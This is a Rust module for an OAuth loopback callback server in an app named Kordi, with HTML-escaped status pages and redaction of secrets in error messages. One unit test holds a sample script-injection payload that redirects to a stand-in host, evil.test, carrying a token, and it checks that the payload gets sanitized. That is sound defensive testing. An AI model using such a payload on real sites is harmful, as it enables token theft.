use anyhow::{Context, Result};
use kordi_provider::ProviderError;
use std::collections::HashMap;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tokio::sync::oneshot;

const KORDI_FAVICON_DATA_URL: &str = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Ccircle cx='18' cy='10' r='9' fill='%231a1714' fill-opacity='.62'/%3E%3Ccircle cx='11' cy='22' r='9' fill='%231a1714' fill-opacity='.82'/%3E%3Ccircle cx='25' cy='22' r='9' fill='%231a1714'/%3E%3C/svg%3E";

/// Result received from the browser redirect.
#[derive(Debug, Clone)]
pub struct CallbackParams {
    pub code: String,
    pub state: String,
}

/// Handle to a running callback server.
pub struct CallbackServer {
    /// Resolves once the browser hits the callback URL.
    pub result_rx: oneshot::Receiver<Result<CallbackParams>>,
    /// Drop or send to cancel the listener task.
    cancel_tx: oneshot::Sender<()>,
}

/// Destructured parts of a `CallbackServer`, useful for `tokio::select!`.
pub struct CallbackServerParts {
    pub result_rx: oneshot::Receiver<Result<CallbackParams>>,
    pub cancel_tx: oneshot::Sender<()>,
}

impl CallbackServer {
    /// Destructure into individual fields so they can be used in
    /// `tokio::select!` without partial-move issues.
    pub fn into_parts(self) -> CallbackServerParts {
        CallbackServerParts {
            result_rx: self.result_rx,
            cancel_tx: self.cancel_tx,
        }
    }
}

/// Start a one-shot HTTP server on `127.0.0.1:{port}` that waits for a GET
/// to `expected_path` (e.g. `/callback`) carrying `code` and `state` query
/// parameters.
pub async fn start_callback_server(port: u16, expected_path: &str) -> Result<CallbackServer> {
    let listener = TcpListener::bind(format!("127.0.0.1:{port}"))
        .await
        .with_context(|| format!("Failed to bind callback server on port {port}"))?;

    let (result_tx, result_rx) = oneshot::channel();
    let (cancel_tx, cancel_rx) = oneshot::channel::<()>();
    let path = expected_path.to_string();

    tokio::spawn(async move {
        tokio::select! {
            _ = cancel_rx => {}
            accepted = listener.accept() => {
                let result = match accepted {
                    Ok((stream, _addr)) => handle_connection(stream, &path).await,
                    Err(e) => Err(anyhow::anyhow!("Accept failed: {e}")),
                };
                let _ = result_tx.send(result);
            }
        }
    });

    Ok(CallbackServer {
        result_rx,
        cancel_tx,
    })
}

async fn handle_connection(
    mut stream: tokio::net::TcpStream,
    expected_path: &str,
) -> Result<CallbackParams> {
    let mut buf = vec![0u8; 4096];
    let n = stream
        .read(&mut buf)
        .await
        .context("Failed to read from callback connection")?;
    let request = String::from_utf8_lossy(&buf[..n]);

    // Parse the request line: "GET /callback?code=...&state=... HTTP/1.1"
    let request_line = request.lines().next().unwrap_or("");
    let parts: Vec<&str> = request_line.split_whitespace().collect();

    if parts.len() < 2 || parts[0] != "GET" {
        send_response(
            &mut stream,
            400,
            "Bad request.",
            "This sign-in callback is not valid. Return to Kordi and try signing in again.",
        )
        .await;
        anyhow::bail!("OAuth callback did not use GET");
    }

    let full_path = parts[1];
    let (path_part, query_part) = full_path.split_once('?').unwrap_or((full_path, ""));

    if path_part != expected_path {
        send_response(
            &mut stream,
            404,
            "Not found.",
            "This sign-in callback is not valid. Return to Kordi and try signing in again.",
        )
        .await;
        anyhow::bail!("Unexpected OAuth callback path");
    }

    let params = parse_query(query_part);

    let code = params.get("code").cloned().unwrap_or_default();
    let state = params.get("state").cloned().unwrap_or_default();

    if code.is_empty() {
        // Check for error
        let error = params.get("error").cloned().unwrap_or_default();
        let desc = params
            .get("error_description")
            .cloned()
            .unwrap_or_else(|| "Unknown error".into());
        let msg = if error.is_empty() {
            "Missing 'code' parameter".to_string()
        } else {
            format!("{error}: {desc}")
        };
        let sensitive_values = vec![state];
        let safe_message = ProviderError::stream_with_sensitive_values(
            "oauth",
            "callback",
            Some(&msg),
            (!error.is_empty()).then_some(error.as_str()),
            &sensitive_values,
        )
        .to_string();
        let friendly_body = if error.is_empty() {
            "The provider did not return a valid code. Return to Kordi and try signing in again."
        } else {
            "The provider stopped the sign-in flow. Return to Kordi and try signing in again."
        };
        send_response(&mut stream, 400, "Couldn’t sign in.", friendly_body).await;
        anyhow::bail!("OAuth callback error: {safe_message}");
    }

    send_response(
        &mut stream,
        200,
        "Signed in.",
        "Your account is connected. You can close this window and return to Kordi.",
    )
    .await;

    Ok(CallbackParams { code, state })
}

fn parse_query(query: &str) -> HashMap<String, String> {
    query
        .split('&')
        .filter(|s| !s.is_empty())
        .filter_map(|pair| {
            let (k, v) = pair.split_once('=')?;
            Some((url_decode(k), url_decode(v)))
        })
        .collect()
}

fn url_decode(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let mut chars = s.bytes();
    while let Some(b) = chars.next() {
        match b {
            b'%' => {
                let hi = chars.next().unwrap_or(b'0');
                let lo = chars.next().unwrap_or(b'0');
                let hex = [hi, lo];
                if let Ok(s) = std::str::from_utf8(&hex)
                    && let Ok(val) = u8::from_str_radix(s, 16)
                {
                    result.push(val as char);
                    continue;
                }
                result.push('%');
                result.push(hi as char);
                result.push(lo as char);
            }
            b'+' => result.push(' '),
            _ => result.push(b as char),
        }
    }
    result
}

fn html_escape(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#39;")
}

fn render_auth_response_page(title: &str, body: &str) -> String {
    let title = html_escape(title);
    let body = html_escape(body);
    format!(
        r#"<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="color-scheme" content="light dark" />
  <link rel="icon" type="image/svg+xml" href="{favicon}" />
  <title>Kordi sign-in</title>
  <style>
    :root {{
      color-scheme: light dark;
      --paper: #faf9f7;
      --ink: #1a1714;
      --ink-muted: #655e56;
      --footer-ink: #81786f;
      --rule: rgba(26, 23, 20, .09);
    }}
    * {{ box-sizing: border-box; }}
    html, body {{ min-height: 100%; margin: 0; }}
    body {{
      min-height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
      color: var(--ink);
      background: var(--paper);
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      text-rendering: geometricPrecision;
    }}
    .page {{
      min-height: 100vh;
      display: grid;
      grid-template-rows: auto 1fr auto;
    }}
    .wrap {{ width: min(calc(100% - 4.25rem), 520px); margin-inline: auto; }}
    header {{ min-height: 68px; display: flex; align-items: center; border-bottom: 1px solid var(--rule); }}
    header .wrap {{ width: min(calc(100% - 4.25rem), 1312px); }}
    .brand {{
      width: fit-content;
      display: inline-flex;
      align-items: center;
      gap: 10px;
      color: var(--ink);
      font-family: "Iowan Old Style", "Palatino Linotype", Palatino, Georgia, serif;
      font-size: 24px;
      line-height: 1;
    }}
    .brand svg {{ width: 30px; height: 30px; flex: 0 0 auto; }}
    main {{ display: flex; align-items: center; padding-block: 3.5rem 4.5rem; }}
    .copy {{ width: 100%; }}
    h1 {{
      max-width: 11ch;
      margin: 0;
      color: var(--ink);
      font-family: "Iowan Old Style", "Palatino Linotype", Palatino, Georgia, serif;
      font-size: clamp(48px, 8vw, 72px);
      font-weight: 400;
      line-height: .98;
      letter-spacing: -.035em;
      text-wrap: balance;
    }}
    p {{
      max-width: 43ch;
      margin: 18px 0 0;
      color: var(--ink-muted);
      font-size: 15px;
      line-height: 1.65;
      text-wrap: balance;
    }}
    footer {{
      padding: 16px 34px 18px;
      border-top: 1px solid var(--rule);
      color: var(--footer-ink);
      font-size: 11px;
      text-align: center;
    }}
    @media (prefers-color-scheme: dark) {{
      :root {{
        --paper: #191814;
        --ink: #f2efe9;
        --ink-muted: #b8b0a7;
        --footer-ink: #938b82;
        --rule: rgba(242, 239, 233, .09);
      }}
    }}
    @media (max-width: 520px) {{
      .wrap, header .wrap {{ width: calc(100% - 3.5rem); }}
      main {{ align-items: flex-start; padding-block: 5.5rem 3.5rem; }}
      h1 {{ font-size: clamp(48px, 16vw, 62px); }}
    }}
  </style>
</head>
<body>
  <div class="page">
    <header>
      <div class="wrap">
        <div class="brand" aria-label="Kordi">
          <svg viewBox="0 0 36 36" aria-hidden="true">
            <circle cx="18" cy="10" r="9" fill="currentColor" opacity=".62"></circle>
            <circle cx="11" cy="22" r="9" fill="currentColor" opacity=".82"></circle>
            <circle cx="25" cy="22" r="9" fill="currentColor"></circle>
          </svg>
          <span>kordi</span>
        </div>
      </div>
    </header>
    <main class="wrap" role="status" aria-live="polite">
      <section class="copy">
        <h1>{title}</h1>
        <p>{body}</p>
      </section>
    </main>
    <footer>&copy; Kordi 2026</footer>
  </div>
</body>
</html>"#,
        favicon = KORDI_FAVICON_DATA_URL,
    )
}

async fn send_response(stream: &mut tokio::net::TcpStream, status: u16, title: &str, body: &str) {
    let html = render_auth_response_page(title, body);
    let reason = match status {
        200 => "OK",
        400 => "Bad Request",
        404 => "Not Found",
        _ => "OK",
    };
    let response = format!(
        "HTTP/1.1 {status} {reason}\r\n\
         Content-Type: text/html; charset=utf-8\r\n\
         Content-Length: {}\r\n\
         Connection: close\r\n\
         \r\n\
         {html}",
        html.len()
    );
    let _ = stream.write_all(response.as_bytes()).await;
    let _ = stream.flush().await;
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn auth_success_page_matches_the_latest_kordi_completion_surface() {
        let html = render_auth_response_page(
            "Signed in.",
            "Your account is connected. You can close this window and return to Kordi.",
        );

        assert!(html.contains("Signed in."));
        assert!(html.contains("return to Kordi"));
        assert!(html.contains("rel=\"icon\" type=\"image/svg+xml\""));
        assert!(html.contains(KORDI_FAVICON_DATA_URL));
        assert!(html.contains("class=\"brand\""));
        assert!(html.contains("<footer>&copy; Kordi 2026</footer>"));
        assert!(html.contains("prefers-color-scheme: dark"));
        assert!(!html.contains("Close window"));
        assert!(!html.contains("<button"));
        assert!(!html.contains("border-radius: 30px"));
        assert!(!html.contains("box-shadow"));
    }

    #[test]
    fn auth_error_page_uses_clear_retry_copy_without_internal_details() {
        let html = render_auth_response_page(
            "Couldn’t sign in.",
            "The provider did not return a valid code. Return to Kordi and try signing in again.",
        );

        assert!(html.contains("Couldn’t sign in."));
        assert!(html.contains("Return to Kordi and try signing in again"));
        assert!(html.contains("role=\"status\" aria-live=\"polite\""));
        assert!(!html.contains("Missing 'code' parameter"));
        assert!(!html.contains("OAuth callback"));
    }

    #[test]
    fn callback_errors_sanitize_reflected_state_urls_and_markup() {
        let sensitive_values = vec!["state-secret-123".to_string()];
        let error = ProviderError::stream_with_sensitive_values(
            "oauth",
            "callback",
            Some(
                "access_denied: state-secret-123 at https://example.com/callback?code=query-secret",
            ),
            Some("access_denied"),
            &sensitive_values,
        );
        let rendered = error.to_string();

        assert!(rendered.contains("[redacted]"));
        assert!(rendered.contains("https://example.com/callback"));
        assert!(!rendered.contains("state-secret-123"));
        assert!(!rendered.contains("query-secret"));

        let markup = ProviderError::stream(
            "oauth",
            "callback",
            Some("<script>window.location='https://evil.test/?token=secret'</script>"),
            Some("access_denied"),
        );
        assert_eq!(markup.to_string(), "Unknown error");
    }
}
